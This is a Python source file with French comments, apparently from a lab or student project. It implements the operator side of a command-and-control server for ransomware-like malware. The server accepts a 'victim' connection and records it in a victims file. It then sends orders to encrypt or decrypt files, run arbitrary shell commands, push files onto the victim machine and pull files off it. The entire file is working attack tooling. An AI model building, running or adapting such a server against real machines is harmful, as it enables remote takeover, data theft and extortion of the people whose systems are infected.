import socket  # Pour la communication réseau
import os      # Pour vérifier si les fichiers à envoyer existent
import datetime  # Pour l'horodatage des logs


# Adresse permettant d'écouter toutes les interfaces réseau de la VM
ADRESSE_IP = '0.0.0.0' 
# Le port de communication choisi pour le serveur TCP
PORT_ECOUTE = 9526 
# Fichier où seront enregistrés tous les logs
FICHIER_LOG = "serveur_logs.txt"


def ecrire_log(niveau, message):
    """
    Écrit un message dans le fichier de logs avec horodatage.
    Niveaux : INFO, WARNING, ERROR, SUCCESS
    """
    # Récupère la date et l'heure actuelles au format : 2026-01-16 10:00:15
    horodatage = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Formate le message complet : [2026-01-16 10:00:15] [INFO] Message ici
    ligne_log = f"[{horodatage}] [{niveau}] {message}\n"
    
    # Écrit dans le fichier en mode "a" (append = ajouter à la fin)
    with open(FICHIER_LOG, "a", encoding="utf-8") as log:
        log.write(ligne_log)
    
    # Affiche aussi dans le terminal pour le suivi en temps réel
    print(ligne_log.strip())


def demarrer_serveur():
    ecrire_log("INFO", f"Démarrage du serveur C2 sur {ADRESSE_IP}:{PORT_ECOUTE}")
    
    # Création du socket AF_INET = IPv4, SOCK_STREAM = TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serveur_socket:
        # Permet de relancer le script immédiatement sans attendre que le port se libère
        serveur_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Lie l'adresse IP et le port au socket créé
        serveur_socket.bind((ADRESSE_IP, PORT_ECOUTE))
        # Met le serveur en attente de connexions (mode écoute)
        serveur_socket.listen()
        ecrire_log("INFO", f"Serveur en écoute, en attente de connexions...")

        # s.accept() bloque le programme jusqu'à ce qu'un client se connecte
        # Elle renvoie l'objet 'connexion' pour parler au client et son 'adresse'
        connexion, adresse_client = serveur_socket.accept()
        
        with connexion:
            ecrire_log("SUCCESS", f"Nouvelle victime connectée : {adresse_client[0]}:{adresse_client[1]}")

            try:
                # .recv(1024) reçoit jusqu'à 1024 octets de données du client
                # .decode() transforme les octets reçus en texte lisible
                infos_recues = connexion.recv(1024).decode()
                ecrire_log("INFO", f"Informations reçues de {adresse_client[0]} : {infos_recues}")

                # Ouvre 'base_victimes.txt' pour ajouter du texte à la fin grace au mode "a" (append)
                with open("base_victimes.txt", "a") as victimes:
                    # Écrit les infos reçues pour les stocker de façon persistante
                    victimes.write(f"{adresse_client} -> {infos_recues}\n")
                
                ecrire_log("INFO", f"Victime {adresse_client[0]} enregistrée dans la base de données")

                # Boucle infinie pour envoyer des ordres tant qu'on ne quitte pas
                while True:
                    # input() récupère ce que tu tapes au clavier
                    ordre = input("\nAction (chiffrer/dechiffrer/system/upload/download/exit) > ").strip().lower()

                    # Si l'entrée est vide, on recommence la boucle
                    if not ordre: 
                        continue
                    
                    ecrire_log("INFO", f"Commande envoyée à {adresse_client[0]} : {ordre}")
                    
                    # .encode() transforme le texte en octets pour l'envoi sur le réseau
                    # .sendall() s'assure que tout le message est bien envoyé
                    connexion.sendall(ordre.encode())

                    # Sortie de la boucle si l'utilisateur veut arrêter
                    if ordre == "exit":
                        ecrire_log("INFO", f"Déconnexion de la victime {adresse_client[0]}")
                        break

                    # Si l'ordre est 'system', on demande quelle commande exécuter sur la victime
                    if ordre == "system":
                        commande_shell = input("Commande système à envoyer : ")
                        ecrire_log("INFO", f"Commande système envoyée : {commande_shell}")
                        # Envoie la commande spécifique après l'ordre 'system'
                        connexion.sendall(commande_shell.encode())
                    
                    elif ordre == "upload":
                        # Demande le nom du fichier présent sur le serveur à envoyer
                        nom_fichier = input("Fichier à envoyer au client : ")
                        # Envoie le nom du fichier au client pour qu'il sache comment l'appeler
                        connexion.sendall(nom_fichier.encode())
                        
                        # Vérifie si le fichier existe bien localement
                        if os.path.exists(nom_fichier):
                            # Ouvre le fichier en lecture binaire
                            with open(nom_fichier, "rb") as f:
                                contenu = f.read()
                                taille = len(contenu)
                                # Envoie d'abord la taille du fichier (calibrée sur 16 caractères)
                                connexion.sendall(str(taille).encode().ljust(16))
                                # Envoie les données réelles du fichier
                                connexion.sendall(contenu)

                            # APRES l'envoi, on lit la confirmation du client 
                            confirmation = connexion.recv(1024).decode()
                            ecrire_log("SUCCESS", f"Fichier '{nom_fichier}' ({taille} octets) envoyé à {adresse_client[0]}")
                        else:
                            ecrire_log("ERROR", f"Tentative d'upload échouée : fichier '{nom_fichier}' introuvable")
                        # Remonte au début de la boucle sans attendre de réponse
                        continue

                    elif ordre == "download":
                        # Demande quel fichier récupérer sur la machine de la victime
                        nom_fichier = input("Fichier à récupérer du client : ")
                        # Envoie le nom au client
                        connexion.sendall(nom_fichier.encode())
                        
                        # Reçoit la taille du fichier (16 octets)
                        taille_brute = connexion.recv(16).decode().strip()
                        
                        # Vérifie si le client a envoyé un message d'erreur au lieu d'une taille
                        if "ERREUR" in taille_brute:
                            ecrire_log("ERROR", f"Download échoué : fichier '{nom_fichier}' introuvable sur {adresse_client[0]}")
                        else:
                            # Reçoit les données selon la taille annoncée
                            taille = int(taille_brute)
                            donnees = connexion.recv(taille)
                            # Sauvegarde le fichier avec un préfixe pour le distinguer
                            with open("DL_" + nom_fichier, "wb") as f:
                                f.write(donnees)
                            ecrire_log("SUCCESS", f"Fichier '{nom_fichier}' ({taille} octets) téléchargé depuis {adresse_client[0]}")
                        # Remonte au début de la boucle sans attendre de réponse
                        continue

                    # Attend la réponse du client (résultat du chiffrement ou de la commande)
                    reponse_client = connexion.recv(4096).decode()
                    print(f"\n[RETOUR CLIENT] :\n{reponse_client}")
                    ecrire_log("INFO", f"Réponse reçue de {adresse_client[0]} : {reponse_client[:100]}...")
            
            except Exception as e:
                ecrire_log("ERROR", f"Erreur avec {adresse_client[0]} : {str(e)}")
            
            finally:
                ecrire_log("INFO", f"Connexion avec {adresse_client[0]} fermée")


if __name__ == "__main__":
    try:
        demarrer_serveur()
    except KeyboardInterrupt:
        ecrire_log("WARNING", "Serveur arrêté par l'utilisateur (Ctrl+C)")
    except Exception as e:
        ecrire_log("ERROR", f"Erreur fatale du serveur : {str(e)}")
